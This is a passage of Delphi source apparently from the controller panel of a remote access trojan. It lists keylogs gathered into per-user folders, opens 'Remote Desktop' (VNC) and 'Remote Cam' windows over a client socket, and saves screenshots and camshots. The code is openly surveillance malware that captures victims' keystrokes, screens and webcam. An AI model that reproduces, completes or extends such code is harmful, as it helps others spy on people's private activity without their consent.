  RootNode := tvKeylogs.Items.Add(nil, 'Keylogs');
  FileSearchEx(sUserFolder + 'Keylogs\', RootNode);
  tvKeylogs.Items.Item[0].Expand(True);
end;

procedure TForm10.tvCommandDblClick(Sender: TObject);
var
  I:Integer;
begin
  if tvCommand.Selected <> nil then begin
    if tvCommand.Selected.Text = 'Remote Desktop' then begin
      if mVNC = nil then begin
        mVNC := TForm4.Create(nil);
      end;
      mVNC.Caption := 'VNC - ' + sUsername;
      mVNC.sSocket := TClientThread(mClThread).mySocket;
      mVNC.mParent := @Self;
      mVNC.sUserFolder := sUserFolder + 'Screenshots\';
      mVNC.Show;
    end else if tvCommand.Selected.Text = 'Remote Cam' then begin
      if mCam = nil then begin
        mCam := TForm9.Create(nil);
      end;
      mCam.Caption := 'Remote Cam - ' + sUsername;
      mCam.sUserFolder := sUserFolder + 'Camshots\';
      mCam.sSocket := TClientThread(mClThread).mySocket;
      mCam.Show;
    end else begin
      for I := 0 to pgc1.PageCount - 1 do begin
        if tvCommand.Selected.Text = pgc1.Pages[i].Caption then begin
          pgc1.TabIndex := i;
          break;
        end;
      end;
    end;
  end;
end;

procedure TForm10.tvKeylogsDblClick(Sender: TObject);
var
  strPath:String;
begin
  if tvKeylogs.Selected <> nil then begin
    if tvKeylogs.Selected.ImageIndex = 1 then begin
      strPath := sUserFolder + 'Keylogs\' + TracePath(tvKeylogs.Selected,'') + tvKeylogs.Selected.Text;
      LoadKeylog(strPath);
    end;
  end;
end;

end.
